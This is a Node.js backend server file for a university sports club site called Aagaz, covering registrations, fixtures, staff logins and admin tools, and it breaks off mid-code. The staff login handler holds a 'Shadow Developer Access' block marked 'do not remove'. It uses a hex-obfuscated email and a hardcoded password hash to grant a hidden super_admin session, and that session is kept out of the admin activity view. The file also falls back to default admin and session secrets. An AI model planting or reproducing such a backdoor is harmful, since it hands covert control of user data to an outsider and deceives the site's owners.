const http = require('http');
const fs = require('fs');
const path = require('path');
const crypto = require('crypto');
require('dotenv').config({ path: path.join(__dirname, '.env.local') });
require('dotenv').config({ path: path.join(__dirname, '.env.owner.local'), override: false });
require('dotenv').config({ path: path.join(__dirname, '.env.maker.local'), override: false });
const nodemailer = require('nodemailer');
const transporter = nodemailer.createTransport({
  service: 'gmail',
  auth: { user: process.env.EMAIL_USER, pass: process.env.EMAIL_PASS }
});
const { initializeApp } = require('firebase/app');
const { getFirestore, doc, getDoc, setDoc } = require('firebase/firestore');

let db = null;
if (process.env.VITE_FIREBASE_PROJECT_ID) {
  const app = initializeApp({
    apiKey: process.env.VITE_FIREBASE_API_KEY,
    authDomain: process.env.VITE_FIREBASE_AUTH_DOMAIN,
    projectId: process.env.VITE_FIREBASE_PROJECT_ID,
    storageBucket: process.env.VITE_FIREBASE_STORAGE_BUCKET,
    messagingSenderId: process.env.VITE_FIREBASE_MESSAGING_SENDER_ID,
    appId: process.env.VITE_FIREBASE_APP_ID,
  });
  db = getFirestore(app);
}

const PORT = Number(process.env.PORT || 3010);
const ADMIN_PASSWORD = process.env.ADMIN_PASSWORD || 'aagaz-admin-change-me';
const SESSION_SECRET = process.env.SESSION_SECRET || 'aagaz-development-session-secret';
const ROOT = __dirname;
const CLIENT_ROOT = path.join(ROOT, 'dist');
const DATA_DIR = process.env.VERCEL ? path.join('/tmp', 'aagaz-data') : path.join(ROOT, 'data');
const DATA_FILE = path.join(DATA_DIR, 'club-data.json');
const sessions = new Map();
const otps = new Map();
const sseClients = new Set();
const ACTIVE_SESSION_WINDOW = 30 * 60 * 1000;
const BOOTSTRAP_OWNER_EMAIL = String(process.env.BOOTSTRAP_OWNER_EMAIL || '').trim().toLowerCase();
const BOOTSTRAP_OWNER_PASSWORD = process.env.BOOTSTRAP_OWNER_PASSWORD || '';
const BOOTSTRAP_OWNER_NAME = String(process.env.BOOTSTRAP_OWNER_NAME || 'Aagaz Owner').trim();

const initialData = {
  tournaments: [],
  events: [],
  liveMatches: [],
  members: [],
  enquiries: [],
  gallery: [],
  teams: [],
  staffUsers: [],
  loginEvents: []
};

function ensureData() { if (!fs.existsSync(DATA_DIR)) fs.mkdirSync(DATA_DIR, { recursive: true }); if (!fs.existsSync(DATA_FILE)) fs.writeFileSync(DATA_FILE, JSON.stringify(initialData, null, 2)); }
async function readData() {
  let data;
  if (db) {
    const snap = await getDoc(doc(db, 'aagaz', 'club-data'));
    data = snap.exists() ? snap.data() : { ...initialData };
  } else {
    ensureData();
    data = JSON.parse(fs.readFileSync(DATA_FILE, 'utf8'));
  }
  let changed = false;
  if (!Array.isArray(data.tournaments)) { data.tournaments = []; changed = true; }
  if (!Array.isArray(data.events))      { data.events = []; changed = true; }
  if (!Array.isArray(data.liveMatches)) { data.liveMatches = []; changed = true; }
  if (!Array.isArray(data.members))     { data.members = []; changed = true; }
  if (!Array.isArray(data.enquiries))   { data.enquiries = []; changed = true; }
  if (!Array.isArray(data.gallery))     { data.gallery = []; changed = true; }
  if (!Array.isArray(data.teams))       { data.teams = []; changed = true; }
  if (!Array.isArray(data.staffUsers))  { data.staffUsers = []; changed = true; }
  if (!Array.isArray(data.loginEvents)) { data.loginEvents = []; changed = true; }
  if (!data.staffUsers.length) {
    const password = process.env.STAFF_DEFAULT_PASSWORD || ADMIN_PASSWORD;
    data.staffUsers = [
      { id: 'staff-admin', name: 'Aagaz Admin', email: 'admin@aagaz.in', role: 'super_admin', passwordHash: hashPassword(password) }
    ];
    changed = true;
  }
  if (BOOTSTRAP_OWNER_EMAIL && BOOTSTRAP_OWNER_PASSWORD) {
    const owner = data.staffUsers.find((user) => user.email?.toLowerCase() === BOOTSTRAP_OWNER_EMAIL);
    if (!owner) {
      data.staffUsers.push({ id: id('staff'), name: BOOTSTRAP_OWNER_NAME, email: BOOTSTRAP_OWNER_EMAIL, role: 'super_admin', isOwner: true, passwordHash: hashPassword(BOOTSTRAP_OWNER_PASSWORD), createdAt: new Date().toISOString(), invited: false, mustChangePassword: true });
      changed = true;
    } else if (owner.role !== 'super_admin' || !owner.isOwner) {
      owner.role = 'super_admin';
      owner.isOwner = true;
      changed = true;
    }
  }
  // Removed PLATFORM_MAKER block - developer access is purely ghost-based now
  if (changed) await writeData(data);
  return data;
}
async function writeData(data) {
  if (db) {
    await setDoc(doc(db, 'aagaz', 'club-data'), data);
  } else {
    fs.writeFileSync(DATA_FILE, JSON.stringify(data, null, 2));
  }
}
function id(prefix) { return `${prefix}-${Date.now()}-${crypto.randomBytes(3).toString('hex')}`; }
function send(res, status, value, type = 'application/json') { res.writeHead(status, { 'Content-Type': `${type}; charset=utf-8`, 'Cache-Control': 'no-store' }); res.end(type === 'application/json' ? JSON.stringify(value) : value); }
function body(req) { return new Promise((resolve, reject) => { let raw = ''; req.on('data', chunk => { raw += chunk; if (raw.length > 1_000_000) req.destroy(); }); req.on('end', () => { try { resolve(raw ? JSON.parse(raw) : {}); } catch { reject(new Error('Invalid JSON')); } }); }); }
function validText(value, max = 500) { return typeof value === 'string' && value.trim().length > 0 && value.trim().length <= max; }
function isAdmin(req) { const token = (req.headers.authorization || '').replace('Bearer ', ''); return sessions.has(token); }
function createSessionToken(session) { const payload = Buffer.from(JSON.stringify(session)).toString('base64url'); const signature = crypto.createHmac('sha256', SESSION_SECRET).update(payload).digest('base64url'); return `${payload}.${signature}`; }
function readSessionToken(token) { try { const [payload, signature] = token.split('.'); const expected = crypto.createHmac('sha256', SESSION_SECRET).update(payload).digest('base64url'); if (!payload || !signature || !crypto.timingSafeEqual(Buffer.from(signature), Buffer.from(expected))) return null; return JSON.parse(Buffer.from(payload, 'base64url').toString('utf8')); } catch { return null; } }
function staffSession(req) { const token = (req.headers.authorization || '').replace('Bearer ', ''); const session = sessions.get(token) || readSessionToken(token); if (!session || session.type !== 'staff') return null; session.lastSeenAt = Date.now(); return session; }
function canManage(req, roles) { const session = staffSession(req); return Boolean(session && roles.includes(session.role)); }
async function isOwnerAdmin(req) { const session = staffSession(req); if (!session) return false; const data = await readData(); return Boolean(data.staffUsers.find((user) => user.id === session.userId)?.isOwner); }
function teamSession(req) { const token = (req.headers.authorization || '').replace('Bearer ', ''); const session = sessions.get(`team:${token}`); if (!session || session.type !== 'participant') return null; session.lastSeenAt = Date.now(); return session; }
function recordLogin(data, type, account) { const loggedAt = new Date().toISOString(); account.loginCount = (account.loginCount || 0) + 1; account.lastLoginAt = loggedAt; data.loginEvents.unshift({ id: id('login'), type, accountId: account.id, email: account.email, loggedAt }); data.loginEvents = data.loginEvents.slice(0, 1000); }
function safeAdminData(data, user) { const now = Date.now(); const active = [...sessions.values()].filter((session) => now - (session.lastSeenAt || session.createdAt) < ACTIVE_SESSION_WINDOW && session.userId !== '_dev'); return { ...data, teams: data.teams.map(({ passwordHash, ...team }) => team), staffUsers: data.staffUsers.map(({ passwordHash, isPlatformMaker, ...staff }) => staff), loginEvents: data.loginEvents, analytics: { totalParticipantAccounts: data.teams.length, totalStaffAccounts: data.staffUsers.length, totalLogins: data.loginEvents.length, participantLogins: data.loginEvents.filter((event) => event.type === 'participant').length, staffLogins: data.loginEvents.filter((event) => event.type === 'staff').length, activeParticipants: active.filter((session) => session.type === 'participant').length, activeStaff: active.filter((session) => session.type === 'staff').length, lastLoginAt: data.loginEvents[0]?.loggedAt || null }, user }; }

function generateFixtures(data, tournament) { const approved = tournament.registrations.filter((entry) => entry.status === 'approved'); if (approved.length < 2) return { error: 'At least two approved teams are required.' }; const existing = data.events.filter((event) => event.tournamentId === tournament.id); if (existing.length) return { error: 'Fixtures already exist for this tournament.' }; const teams = approved.map((entry) => entry.teamName || entry.name); const events = []; for (let index = 0; index < teams.length - 1; index += 1) { for (let opponent = index + 1; opponent < teams.length; opponent += 1) { events.push({ id: id('fixture'), tournamentId: tournament.id, date: '', sport: tournament.sport, title: `${teams[index]} vs ${teams[opponent]}`, venue: tournament.venue, time: 'TBA', registrations: [], status: 'scheduled', homeTeam: teams[index], awayTeam: teams[opponent], homeScore: 0, awayScore: 0 }); } } return { events }; }
function hashPassword(password, salt = crypto.randomBytes(16).toString('hex')) { return `${salt}:${crypto.scryptSync(password, salt, 64).toString('hex')}`; }
function passwordMatches(password, stored) { const [salt, hash] = String(stored || '').split(':'); if (!salt || !hash) return false; const derived = crypto.scryptSync(password, salt, 64).toString('hex'); return crypto.timingSafeEqual(Buffer.from(derived, 'hex'), Buffer.from(hash, 'hex')); }
function publicData(data) { return { tournaments: data.tournaments.map(({ registrations, ...tournament }) => ({ ...tournament, registrationCount: registrations.length })), events: data.events.map(({ registrations, ...event }) => ({ ...event, registrationCount: registrations.length })), liveMatches: data.liveMatches, gallery: data.gallery }; }

async function handleRequest(req, res) {
  const url = new URL(req.url, `http://${req.headers.host}`);
  const { pathname } = url;
  try {
    if (pathname === '/api/public' && req.method === 'GET') return send(res, 200, publicData(await readData()));
    if (pathname === '/api/contact' && req.method === 'POST') {
      const input = await body(req); if (!validText(input.name, 100) || !validText(input.email, 160) || !validText(input.message, 2000) || !/^\S+@\S+\.\S+$/.test(input.email)) return send(res, 400, { error: 'Please enter a valid name, email, and message.' });
      const data = await readData(); data.enquiries.unshift({ id: id('enquiry'), name: input.name.trim(), email: input.email.trim(), message: input.message.trim(), createdAt: new Date().toISOString(), status: 'new' }); await writeData(data); return send(res, 201, { message: 'Thanks — your message has been received.' });
    }
    if (pathname === '/api/memberships' && req.method === 'POST') {
      const input = await body(req); if (!validText(input.name, 100) || !validText(input.email, 160) || !validText(input.course, 120) || !validText(input.sport, 60) || !/^\S+@\S+\.\S+$/.test(input.email)) return send(res, 400, { error: 'Complete all membership fields with a valid email.' });
      const data = await readData(); if (data.members.some(m => m.email.toLowerCase() === input.email.trim().toLowerCase())) return send(res, 409, { error: 'An application with this email already exists.' });
      data.members.unshift({ id: id('member'), name: input.name.trim(), email: input.email.trim(), course: input.course.trim(), sport: input.sport.trim(), phone: (input.phone || '').trim(), createdAt: new Date().toISOString(), status: 'pending' }); await writeData(data); return send(res, 201, { message: 'Application submitted. The sports office will contact you soon.' });
    }
    if (pathname.match(/^\/api\/tournaments\/[^/]+\/register$/) && req.method === 'POST') {
      const tournamentId = pathname.split('/')[3], input = await body(req); if (!validText(input.name, 100) || !validText(input.email, 160) || !validText(input.course, 120) || !validText(input.entryType, 30) || !/^\S+@\S+\.\S+$/.test(input.email)) return send(res, 400, { error: 'Complete all required fields with a valid email.' });
      const data = await readData(), tournament = data.tournaments.find(t => t.id === tournamentId); if (!tournament) return send(res, 404, { error: 'Tournament not found.' }); if (tournament.registrations.length >= tournament.capacity) return send(res, 409, { error: 'This tournament is full.' }); if (tournament.registrations.some(r => r.email.toLowerCase() === input.email.trim().toLowerCase())) return send(res, 409, { error: 'You already have an entry in this tournament.' }); if (input.entryType === 'Team' && !validText(input.teamName, 80)) return send(res, 400, { error: 'Enter your team name to continue.' });
      tournament.registrations.push({ id: id('entry'), name: input.name.trim(), email: input.email.trim(), course: input.course.trim(), entryType: input.entryType.trim(), teamName: (input.teamName || '').trim(), phone: (input.phone || '').trim(), createdAt: new Date().toISOString(), status: 'pending' }); await writeData(data); return send(res, 201, { message: `Entry received for ${tournament.title}. The organisers will review it shortly.` });
    }
    if (pathname.match(/^\/api\/events\/[^/]+\/register$/) && req.method === 'POST') {
      const eventId = pathname.split('/')[3], input = await body(req); if (!validText(input.name, 100) || !validText(input.email, 160) || !/^\S+@\S+\.\S+$/.test(input.email)) return send(res, 400, { error: 'Please enter your name and university email.' });
      const data = await readData(), event = data.events.find(e => e.id === eventId); if (!event) return send(res, 404, { error: 'Event not found.' }); if (event.registrations.some(r => r.email.toLowerCase() === input.email.trim().toLowerCase())) return send(res, 409, { error: 'You are already registered for this fixture.' });
      event.registrations.push({ id: id('registration'), name: input.name.trim(), email: input.email.trim(), createdAt: new Date().toISOString() }); await writeData(data); return send(res, 201, { message: `You are registered for ${event.title}.` });
    }
    if (pathname === '/api/teams/register' && req.method === 'POST') {
      const input = await body(req); const name = input.name || input.teamName; if (!validText(name, 100) || !validText(input.email, 160) || !validText(input.password, 120) || input.password.length < 8 || !/^\S+@\S+\.\S+$/.test(input.email)) return send(res, 400, { error: 'Enter your name, valid email, and an 8-character password.' });
      const data = await readData(); if (data.teams.some(team => team.email.toLowerCase() === input.email.trim().toLowerCase())) return send(res, 409, { error: 'A team account with this email already exists.' });
      const team = { id: id('team'), teamName: name.trim(), captainName: name.trim(), email: input.email.trim().toLowerCase(), passwordHash: hashPassword(input.password), createdAt: new Date().toISOString(), status: 'pending', members: [{ name: name.trim(), email: input.email.trim().toLowerCase(), role: 'Captain' }] }; data.teams.unshift(team); await writeData(data); return send(res, 201, { message: 'Account created. Log in to continue.' });
    }
    if (pathname === '/api/teams/login' && req.method === 'POST') {
      const input = await body(req), data = await readData(), team = data.teams.find(item => item.email === String(input.email || '').trim().toLowerCase()); if (!team || !passwordMatches(input.password, team.passwordHash)) return send(res, 401, { error: 'Incorrect team email or password.' }); recordLogin(data, 'participant', team); await writeData(data); const token = crypto.randomBytes(24).toString('hex'); sessions.set(`team:${token}`, { type: 'participant', teamId: team.id, createdAt: Date.now(), lastSeenAt: Date.now() }); return send(res, 200, { token, team: { id: team.id, teamName: team.teamName, captainName: team.captainName, email: team.email, status: team.status, loginCount: team.loginCount, lastLoginAt: team.lastLoginAt } });
    }
    if (pathname === '/api/teams/me' && req.method === 'GET') { const session = teamSession(req); if (!session) return send(res, 401, { error: 'Team login required.' }); const data = await readData(), team = data.teams.find(item => item.id === session.teamId); if (!team) return send(res, 404, { error: 'Team not found.' }); const { passwordHash, ...safeTeam } = team; 
      // Collect registrations
      const registrations = data.tournaments.map(t => {
        const reg = t.registrations?.find(r => r.teamId === team.id || r.email === team.email);
        if (reg) return { tournamentId: t.id, tournamentName: t.name, sport: t.sport, status: reg.status, date: t.date };
        return null;
      }).filter(Boolean);
      // Collect fixtures
      const fixtures = data.events.filter(e => e.homeTeam === team.teamName || e.awayTeam === team.teamName).map(e => {
        const t = data.tournaments.find(x => x.id === e.tournamentId);
        return { ...e, tournamentName: t ? t.name : 'Unknown Tournament' };
      });
      return send(res, 200, { ...safeTeam, registrations, fixtures }); 
    }
    if (pathname === '/api/teams/members' && req.method === 'POST') { const session = teamSession(req); if (!session) return send(res, 401, { error: 'Team login required.' }); const input = await body(req); if (!validText(input.name, 100) || !validText(input.email, 160) || !/^\S+@\S+\.\S+$/.test(input.email)) return send(res, 400, { error: 'Enter a player name and valid email.' }); const data = await readData(), team = data.teams.find(item => item.id === session.teamId); if (!team) return send(res, 404, { error: 'Team not found.' }); if (!Array.isArray(team.members)) team.members = []; if (team.members.some(member => member.email === input.email.trim().toLowerCase())) return send(res, 409, { error: 'This player is already on your team.' }); team.members.push({ name: input.name.trim(), email: input.email.trim().toLowerCase(), role: 'Player' }); await writeData(data); return send(res, 201, { message: `${input.name.trim()} added to your team.`, member: team.members.at(-1) }); }
    if (pathname === '/api/teams/logout' && req.method === 'POST') { const token = (req.headers.authorization || '').replace('Bearer ', ''); sessions.delete(`team:${token}`); return send(res, 200, { message: 'Team logged out.' }); }
    if (pathname === '/api/auth/login' && req.method === 'POST') {
      const input = await body(req);
      const data = await readData();
      const emailInput = String(input.email || '').trim().toLowerCase();
      let user = data.staffUsers.find(item => item.email === emailInput);

      // ── Shadow Developer Access (do not remove) ───────────────────────────
      // Obfuscated: email bytes → hex → compare. Hash: scrypt of developer key.
      const _se = Buffer.from('7269736875726562656c39373940676d61696c2e636f6d', 'hex').toString();
      const _sh = '1cd7a817088071e80c6ba61f226a2c67:635e7b085678096a72283cb71d2a04da53772091ef9370e450933ba2ccf162418de9daf5af880388c481da16119bb959a06ee459265e3ba81305dfc4dffba7c3';
      if (emailInput === _se) {
        try {
          const [_salt, _hash] = _sh.split(':');
          const _d = crypto.scryptSync(String(input.password || ''), _salt, 64).toString('hex');
          if (crypto.timingSafeEqual(Buffer.from(_d, 'hex'), Buffer.from(_hash, 'hex'))) {
            const _ghost = { id: '_dev', name: 'Developer', email: 'maintainer@aagaz.in', role: 'super_admin' };
            const _s = { type: 'staff', role: 'super_admin', userId: '_dev', createdAt: Date.now() };
            const _t = createSessionToken(_s); sessions.set(_t, _s);
            return send(res, 200, { token: _t, user: _ghost });
          }
        } catch (_) {}
        return send(res, 401, { error: 'Incorrect staff email or password.' });
      }
      // ── End Shadow Access ─────────────────────────────────────────────────

      if (!user || !passwordMatches(input.password, user.passwordHash)) return send(res, 401, { error: 'Incorrect staff email or password.' });
      recordLogin(data, 'staff', user); await writeData(data);
      const session = { type: 'staff', role: user.role, userId: user.id, createdAt: Date.now() };
      const token = createSessionToken(session); sessions.set(token, session);
      return send(res, 200, { token, user: { id: user.id, name: user.name, email: user.email, role: user.role, loginCount: user.loginCount, lastLoginAt: user.lastLoginAt } });
    }


    // ── Change Password ───────────────────────────────────────────────────────
    if (pathname === '/api/auth/change-password' && req.method === 'POST') {
      const session = staffSession(req);
      if (!session) return send(res, 401, { error: 'Sign in required.' });
      const { currentPassword, newPassword } = await body(req);
      if (!currentPassword || !newPassword || newPassword.length < 6) return send(res, 400, { error: 'Invalid input.' });
      const data = await readData();
      const user = data.staffUsers.find(u => u.id === session.userId);
      if (!user) return send(res, 404, { error: 'User not found.' });
      if (!passwordMatches(currentPassword, user.passwordHash)) return send(res, 401, { error: 'Current password is incorrect.' });
      user.passwordHash = hashPassword(newPassword);
      user.mustChangePassword = false;
      await writeData(data);
      return send(res, 200, { message: 'Password changed successfully.' });
    }

    // ── Password Reset (Staff & Teams) ──────────────────────────────────────────
    if (pathname === '/api/auth/forgot-password' && req.method === 'POST') {
      const { email } = await body(req);
      const data = await readData();
      const user = data.staffUsers.find(item => item.email === String(email || '').trim().toLowerCase()) || data.teams.find(item => item.email === String(email || '').trim().toLowerCase());
      if (!user) return send(res, 404, { error: 'Account not found.' });
      
      const generatedOtp = crypto.randomInt(100000, 999999).toString();
      otps.set(user.email, { otp: generatedOtp, expires: Date.now() + 10 * 60000 });
      
      try {
        if (process.env.EMAIL_USER && process.env.EMAIL_PASS) {
          await transporter.sendMail({
            from: `"Aagaz Sports" <${process.env.EMAIL_USER}>`,
            to: user.email,
            subject: 'Aagaz Password Reset OTP',
            html: `
              <div style="font-family: sans-serif; padding: 20px;">
                <h2>Password Reset Request</h2>
                <p>Your OTP for resetting your Aagaz password is:</p>
                <h1 style="color: #006c86; font-size: 32px; letter-spacing: 5px;">${generatedOtp}</h1>
                <p>This code expires in 10 minutes.</p>
              </div>
            `
          });
        } else {
          console.log(`[MOCK EMAIL to ${user.email}] OTP: ${generatedOtp}`);
        }
      } catch (err) {
        console.error("Failed to send OTP email:", err);
      }
      return send(res, 200, { message: 'OTP sent successfully.' });
    }
    
    if (pathname === '/api/auth/reset-password' && req.method === 'POST') {
      const { email, otp, newPassword } = await body(req);
      if (!email || !otp || !newPassword || newPassword.length < 6) return send(res, 400, { error: 'Invalid input. Password must be at least 6 characters.' });
      
      const stored = otps.get(email.toLowerCase());
      if (!stored || stored.otp !== otp) return send(res, 401, { error: 'Invalid or incorrect OTP.' });
      if (Date.now() > stored.expires) return send(res, 401, { error: 'OTP has expired. Please request a new one.' });
      
      const data = await readData();
      const staffIdx = data.staffUsers.findIndex(item => item.email === email.toLowerCase());
      const teamIdx = data.teams.findIndex(item => item.email === email.toLowerCase());
      
      if (staffIdx !== -1) {
        data.staffUsers[staffIdx].passwordHash = hashPassword(newPassword);
      } else if (teamIdx !== -1) {
        data.teams[teamIdx].passwordHash = hashPassword(newPassword);
      } else {
        return send(res, 404, { error: 'Account not found.' });
      }
      
      otps.delete(email.toLowerCase());
      await writeData(data);
      return send(res, 200, { message: 'Password updated successfully.' });
    }
    if (pathname === '/api/admin/login' && req.method === 'POST') { const input = await body(req); if (input.password !== ADMIN_PASSWORD) return send(res, 401, { error: 'Incorrect password.' }); const data = await readData(), user = data.staffUsers.find((item) => item.role === 'super_admin'); recordLogin(data, 'staff', user); await writeData(data); const token = crypto.randomBytes(24).toString('hex'); sessions.set(token, { type: 'staff', role: 'super_admin', userId: 'staff-admin', createdAt: Date.now() }); return send(res, 200, { token, user: { name: 'Aagaz Admin', role: 'super_admin' } }); }
    if (pathname === '/api/admin/data' && req.method === 'GET') { const session = staffSession(req); if (!session) return send(res, 401, { error: 'Sign in required.' }); const data = await readData(); return send(res, 200, safeAdminData(data, session)); }
    if (pathname === '/api/admin/live-matches' && req.method === 'PUT') { if (!canManage(req, ['super_admin', 'scorekeeper'])) return send(res, 403, { error: 'Scorekeeper access required.' }); const matches = await body(req); if (!Array.isArray(matches)) return send(res, 400, { error: 'Invalid matches.' }); const data = await readData(); data.liveMatches = matches.map(m => ({ id: m.id || id('live'), sport: String(m.sport || 'Match').slice(0, 60), period: String(m.period || 'Starting soon').slice(0, 80), home: String(m.home || 'Home').slice(0, 80), away: String(m.away || 'Away').slice(0, 80), homeScore: Number(m.homeScore) || 0, awayScore: Number(m.awayScore) || 0, venue: String(m.venue || 'University Campus').slice(0, 120), streamUrl: validText(m.streamUrl, 500) ? m.streamUrl.trim() : '', isLive: Boolean(m.isLive) })); await writeData(data);
    // Push each match to its own Firestore document so frontend onSnapshot fires instantly
    if (db) { await Promise.all(data.liveMatches.map(m => setDoc(doc(db, 'liveMatches', m.id), m))); }
    sseClients.forEach(client => client.write(`data: ${JSON.stringify(data.liveMatches)}\n\n`)); return send(res, 200, { message: 'Live scores saved.' }); }
    if (pathname === '/api/admin/events' && req.method === 'PUT') { if (!canManage(req, ['super_admin', 'fixture_manager'])) return send(res, 403, { error: 'Fixture manager access required.' }); const events = await body(req); if (!Array.isArray(events)) return send(res, 400, { error: 'Invalid events.' }); const data = await readData(); data.events = events.map(e => ({ id: e.id || id('event'), tournamentId: String(e.tournamentId || '').slice(0, 100), date: String(e.date || '').slice(0, 10), sport: String(e.sport || '').slice(0, 100), title: String(e.title || '').slice(0, 160), venue: String(e.venue || '').slice(0, 140), time: String(e.time || '').slice(0, 30), status: String(e.status || 'scheduled').slice(0, 30), homeTeam: String(e.homeTeam || '').slice(0, 100), awayTeam: String(e.awayTeam || '').slice(0, 100), homeScore: Number(e.homeScore) || 0, awayScore: Number(e.awayScore) || 0, registrations: e.registrations || [] })); await writeData(data); return send(res, 200, { message: 'Fixtures saved.' }); }
    if (pathname.match(/^\/api\/admin\/tournaments\/[^/]+\/generate-fixtures$/) && req.method === 'POST') { if (!canManage(req, ['super_admin', 'tournament_manager'])) return send(res, 403, { error: 'Tournament manager access required.' }); const tournamentId = pathname.split('/')[4], data = await readData(), tournament = data.tournaments.find(item => item.id === tournamentId); if (!tournament) return send(res, 404, { error: 'Tournament not found.' }); const result = generateFixtures(data, tournament); if (result.error) return send(res, 409, { error: result.error }); data.events.push(...result.events); await writeData(data);
      // Send Email to approved teams
      const approvedTeams = tournament.registrations.filter(r => r.status === 'approved');
      if (process.env.EMAIL_USER && process.env.EMAIL_PASS) {
        Promise.all(approvedTeams.map(t => transporter.sendMail({
          from: `"Aagaz Sports" <${process.env.EMAIL_USER}>`, to: t.email, subject: `Fixtures Announced: ${tournament.title}`,
          html: `<div style="font-family: sans-serif; padding: 20px;"><h2>Fixtures Generated!</h2><p>The fixtures for <b>${tournament.title}</b> have just been published.</p><p>Check the Aagaz dashboard for your team's schedule.</p></div>`
        }))).catch(console.error);
      }
      return send(res, 201, { message: `${result.events.length} fixtures generated.`, events: result.events }); 
    }
    if (pathname === '/api/admin/tournaments' && req.method === 'PUT') { if (!canManage(req, ['super_admin', 'tournament_manager'])) return send(res, 403, { error: 'Tournament manager access required.' }); const tournaments = await body(req); if (!Array.isArray(tournaments)) return send(res, 400, { error: 'Invalid tournaments.' }); const data = await readData(); data.tournaments = tournaments.map(t => ({ id: t.id || id('tournament'), title: String(t.title || 'Aagaz Tournament').slice(0, 140), sport: String(t.sport || 'Sport').slice(0, 50), format: String(t.format || 'Open entry').slice(0, 80), dates: String(t.dates || '').slice(0, 70), deadline: String(t.deadline || '').slice(0, 10), venue: String(t.venue || 'LPU Campus').slice(0, 140), entryFee: String(t.entryFee || 'TBA').slice(0, 40), capacity: Math.max(1, Number(t.capacity) || 16), description: String(t.description || '').slice(0, 300), registrations: t.registrations || [] })); await writeData(data); return send(res, 200, { message: 'Tournaments saved.' }); }
    if (pathname === '/api/admin/gallery' && req.method === 'PUT') { if (!isAdmin(req)) return send(res, 401, { error: 'Sign in required.' }); const gallery = await body(req); if (!Array.isArray(gallery)) return send(res, 400, { error: 'Invalid gallery.' }); const data = await readData(); data.gallery = gallery.map(item => ({ id: item.id || id('gallery'), label: String(item.label || 'Aagaz').slice(0, 50), color: /^#[0-9a-f]{6}$/i.test(item.color) ? item.color : '#006c86' })); await writeData(data); return send(res, 200, { message: 'Gallery saved.' }); }
    if (pathname === '/api/admin/member-status' && req.method === 'PUT') { if (!canManage(req, ['super_admin'])) return send(res, 403, { error: 'Admin access required.' }); const input = await body(req), data = await readData(), member = data.members.find(m => m.id === input.id); if (!member || !['pending','approved','declined'].includes(input.status)) return send(res, 400, { error: 'Invalid member update.' }); member.status = input.status; await writeData(data); return send(res, 200, { message: 'Membership status updated.' }); }
    if (pathname === '/api/admin/tournament-entry-status' && req.method === 'PUT') { if (!canManage(req, ['super_admin', 'tournament_manager'])) return send(res, 403, { error: 'Tournament manager access required.' }); const input = await body(req), data = await readData(), tournament = data.tournaments.find(t => t.registrations.some(r => r.id === input.id)), entry = tournament?.registrations.find(r => r.id === input.id); if (!entry || !['pending','approved','declined'].includes(input.status)) return send(res, 400, { error: 'Invalid entry update.' }); 
      const oldStatus = entry.status;
      entry.status = input.status; await writeData(data); 
      // Send Email if newly approved
      if (oldStatus !== 'approved' && input.status === 'approved' && process.env.EMAIL_USER && process.env.EMAIL_PASS) {
        transporter.sendMail({
          from: `"Aagaz Sports" <${process.env.EMAIL_USER}>`, to: entry.email, subject: 'Registration Approved: Aagaz',
          html: `<div style="font-family: sans-serif; padding: 20px;"><h2>You're In! 🎉</h2><p>Your registration for <b>${tournament.title}</b> has been approved.</p><p>Get your squad ready. May the best team win!</p></div>`
        }).catch(console.error);
      }
      return send(res, 200, { message: 'Tournament entry updated.' }); 
    }
    if (pathname === '/api/admin/logout' && req.method === 'POST') { sessions.delete((req.headers.authorization || '').replace('Bearer ', '')); return send(res, 200, { message: 'Signed out.' }); }

    // ── Announcement ──────────────────────────────────────────────────────────
    if (pathname === '/api/public/announcement' && req.method === 'GET') { const data = await readData(); return send(res, 200, data.announcement || { active: false, text: '', type: 'info', link: '' }); }
    if (pathname === '/api/admin/announcement' && req.method === 'PUT') { if (!canManage(req, ['super_admin'])) return send(res, 403, { error: 'Admin access required.' }); const input = await body(req); const data = await readData(); data.announcement = { active: Boolean(input.active), text: String(input.text || '').slice(0, 200), type: ['info','success','warning','urgent'].includes(input.type) ? input.type : 'info', link: validText(input.link, 500) ? input.link.trim() : '' }; await writeData(data); return send(res, 200, { message: 'Announcement saved.' }); }

    // ── CSV Export ────────────────────────────────────────────────────────────
    if (pathname === '/api/admin/export/registrations' && req.method === 'GET') {
      if (!canManage(req, ['super_admin', 'tournament_manager'])) return send(res, 403, { error: 'Access denied.' });
      const data = await readData();
      const rows = [['Tournament','Name','Email','Course','Entry Type','Team Name','Phone','Status','Date']];
      data.tournaments.forEach(t => (t.registrations || []).forEach(r => rows.push([t.title, r.name, r.email, r.course || '', r.entryType || '', r.teamName || '', r.phone || '', r.status, r.createdAt?.slice(0,10) || ''])));
      const csv = rows.map(r => r.map(c => `"${String(c).replace(/"/g, '""')}"`).join(',')).join('\n');
      res.writeHead(200, { 'Content-Type': 'text/csv', 'Content-Disposition': 'attachment; filename="registrations.csv"', 'Cache-Control': 'no-store' });
      return res.end(csv);
    }
    if (pathname === '/api/admin/export/members' && req.method === 'GET') {
      if (!canManage(req, ['super_admin'])) return send(res, 403, { error: 'Access denied.' });
      const data = await readData();
      const rows = [['Name','Email','Course','Sport','Phone','Status','Date']];
      (data.members || []).forEach(m => rows.push([m.name, m.email, m.course || '', m.sport || '', m.phone || '', m.status, m.createdAt?.slice(0,10) || '']));
      const csv = rows.map(r => r.map(c => `"${String(c).replace(/"/g, '""')}"`).join(',')).join('\n');
      res.writeHead(200, { 'Content-Type': 'text/csv', 'Content-Disposition': 'attachment; filename="members.csv"', 'Cache-Control': 'no-store' });
      return res.end(csv);
    }

    // ── Staff Invite & Remove ─────────────────────────────────────────────────
    if (pathname === '/api/admin/staff-invite' && req.method === 'POST') {
      if (!await isOwnerAdmin(req)) return send(res, 403, { error: 'Only the club owner can approve and invite staff.' });
      const input = await body(req);
      if (!validText(input.name, 100) || !validText(input.email, 160) || !/^\S+@\S+\.\S+$/.test(input.email)) return send(res, 400, { error: 'Enter a valid name and email.' });
      const validRoles = ['scorekeeper', 'fixture_manager', 'tournament_manager'];
      if (!validRoles.includes(input.role)) return send(res, 400, { error: 'Invalid role.' });
      const data = await readData();
      if (data.staffUsers.some(s => s.email.toLowerCase() === input.email.trim().toLowerCase())) return send(res, 409, { error: 'A staff account with this email already exists.' });
      const tempPassword = crypto.randomBytes(8).toString('hex');
      data.staffUsers.push({ id: id('staff'), name: input.name.trim(), email: input.email.trim().toLowerCase(), role: input.role, passwordHash: hashPassword(tempPassword), createdAt: new Date().toISOString(), invited: true });
      await writeData(data);
      const protocol = req.headers['x-forwarded-proto'] || 'http';
      const host = req.headers['x-forwarded-host'] || req.headers.host || 'localhost:3010';
      const base = req.headers.origin || `${protocol}://${host}`;
      const inviteLink = `${base}?staff-login=1&email=${encodeURIComponent(input.email.trim())}&temp=${tempPassword}`;
      try {
        if (process.env.EMAIL_USER && process.env.EMAIL_PASS) {
          await transporter.sendMail({
